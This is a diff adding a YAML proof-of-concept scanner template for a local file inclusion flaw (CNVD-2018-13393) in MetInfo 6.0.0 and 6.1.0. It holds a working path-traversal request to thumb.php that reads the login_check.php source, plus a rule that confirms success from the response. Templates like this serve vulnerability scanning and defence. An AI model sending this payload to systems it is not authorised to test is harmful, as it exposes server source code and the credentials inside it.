@@ -1,0 +1,17 @@
+detail:
+  author: JingLing(https://hackfun.org/)
+  links:
+  - https://paper.seebug.org/676/
+  metinfo_version: 6.0.0,6.1.0
+expression: r0()
+manual: true
+name: poc-yaml-metinfo-lfi-cnvd-2018-13393
+rules:
+  r0:
+    expression: response.body.bcontains(b"<?php") && response.body.bcontains(b"login_met_cookie($metinfo_admin_name);")
+    request:
+      cache: true
+      follow_redirects: true
+      method: GET
+      path: /include/thumb.php?dir=http\..\admin\login\login_check.php
+transport: http
